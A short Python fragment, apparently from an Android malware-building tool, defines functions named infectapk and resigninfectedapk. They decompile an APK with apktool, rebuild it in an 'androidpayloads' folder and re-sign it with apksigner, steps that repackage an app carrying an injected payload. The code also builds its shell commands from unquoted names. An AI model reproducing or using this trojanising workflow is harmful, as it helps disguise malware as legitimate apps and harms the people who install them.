    ...
    if cmodules == 1:
        ...
        def infectapk():
            def resigninfectedapk():
                os.system("cd androidpayloads/ && apktool d "+name+".apk >/dev/null 2>&1 && rm -r "+name+".apk && apktool b "+name+" >/dev/null 2>&1" )
                os.system("cd androidpayloads/ && cd "+name+" && cd dist && mv "+name+".apk ../..")
                os.system("rm -r androidpayloads/"+name)
                os.system("java -jar apksigner.jar --apks androidpayloads/" + name + ".apk >/dev/null 2>&1")
                os.system("cd androidpayloads && mv " + name + "-aligned-debugSigned.apk " + name + ".apk")
            def checkinjection():
